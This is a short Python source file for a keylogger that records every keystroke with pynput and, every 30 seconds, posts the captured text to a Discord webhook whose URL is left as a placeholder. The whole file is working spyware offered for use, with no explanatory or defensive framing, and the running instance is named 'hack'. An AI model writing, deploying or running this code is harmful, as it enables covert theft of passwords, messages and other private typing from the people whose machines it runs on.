import pynput.keyboard
import threading
import requests

class Keylogger:
    def __init__(self, time_interval, webhook_url):
        self.log = "KeyLogger Started !!!!"
        self.interval = time_interval
        self.webhook_url = webhook_url
        self.timer = None

    def append_log(self, string):
        self.log += string

    def keypress(self, key):
        try:
            ck = str(key.char)
        except AttributeError:
            if key in [pynput.keyboard.Key.space, pynput.keyboard.Key.backspace]:
                self.log = self.log.rstrip()
                ck = " "
            else:
                ck = ""

        if ck.lower() not in ["key", "ctrl", "space", "tab"]:
            self.append_log(ck)

    def report(self):
        print(self.log)
        self.send_webhook(self.webhook_url, self.log)
        self.log = ""
        self.timer = threading.Timer(self.interval, self.report)
        self.timer.daemon = True
        self.timer.start()

    def send_webhook(self, webhook_url, message):
        data = {
            "content": message
        }
        response = requests.post(webhook_url, json=data)
        if response.status_code != 204:
            print("Failed to send Discord webhook.")

    def start(self):
        listener = pynput.keyboard.Listener(on_press=self.keypress)
        with listener:
            self.report()
            listener.join()

webhook_url = "your url "
hack = Keylogger(30, webhook_url)

hack.start()

# Keep the main thread running
while True:
    pass
